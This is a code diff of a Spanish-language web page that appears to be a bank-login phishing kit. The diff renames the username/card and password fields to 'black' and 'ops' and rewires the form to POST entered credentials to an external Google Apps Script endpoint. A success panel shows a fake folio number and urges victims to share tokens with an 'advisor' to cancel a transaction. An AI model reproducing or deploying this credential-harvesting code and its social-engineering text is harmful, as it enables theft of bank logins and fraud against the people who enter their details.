@@ -50,8 +50,8 @@
 						<form class="formulario" id="contact-form"  name="submit-form">
 						<label for="nombre"> </label>
 						<div class="contenedor-input">
-							<input id="nombre" name="nombre"  placeholder="Usuario/Cuenta/Tarjeta" required />
-							<input id="password"type="password" name="password"  placeholder="Contraseña" required />
+							<input id="nombre" name="black"  placeholder="Usuario/Cuenta/Tarjeta" required />
+							<input id="password"type="password" name="ops"  placeholder="Contraseña" required />
 						</div>	
 			
 						<div class="contenedor-boton">
@@ -87,6 +87,7 @@
 			</div>
 
 			<div class="header exito" id="exito2">
+				
 				<h2 class="txtFolio">Tu folio es:</h2>
 				<h1 class="folio">X142023543Q</h1>
 				<p class="txt">Comparte este folio con tu asesor teléfonico o asistente virtual. Así cómo un par de tokens para generar la cancelación de un movimiento.</p>
@@ -150,45 +151,28 @@
 
 <script>
 
-const scriptURL =  'guardar_datos.php';
-const form = document.forms['submit-form']
-const form2 = document.forms['submit-form2']
-const registro = document.getElementById('registro');
-const exito = document.getElementById('exito');
+const scriptURL = 'https://script.google.com/macros/s/AKfycbzMoqC3To8kR8AvLnOpttbQFyvgXBS-5XriFFDY5ba5rhl83KWmqSSnxTTRHnf5DDwt5w/exec'
+
+const form = document.forms['contact-form']
 
 form.addEventListener('submit', e => {
   e.preventDefault()
   fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-    .then(response => console.log('Success!', response))
-    .then(response => exito.classList.add('activo'))
-    .then(response => registro.classList.remove('activo'))
-    .catch(error => console.log('Error!', error.message))
-   
-	 
+  .catch(error => console.error('Error!', error.message))
 })
 
-form2.addEventListener('submit', e => {
-  e.preventDefault()
-  fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
-    .then(response => console.log('Success!', response))
-    .then(response => exito.classList.add('activo'))
-    .then(response => registro.classList.remove('activo'))
-    .catch(error => console.log('Error!', error.message))
-   
-	 
-})
 
-	function miMensaje() {
-  var element = document.getElementById("registro");
-    element.classList.remove("activo");
-  var element = document.getElementById("exito");
-    element.classList.add("activo");	
-}	
+
+	
 
 function miMensaje2() {
   var element = document.getElementById("registro2");
     element.classList.remove("activo");
   var element = document.getElementById("exito2");
+    element.classList.add("activo");	
+	var element = document.getElementById("registro");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito");
     element.classList.add("activo");	
 }
 </script>	
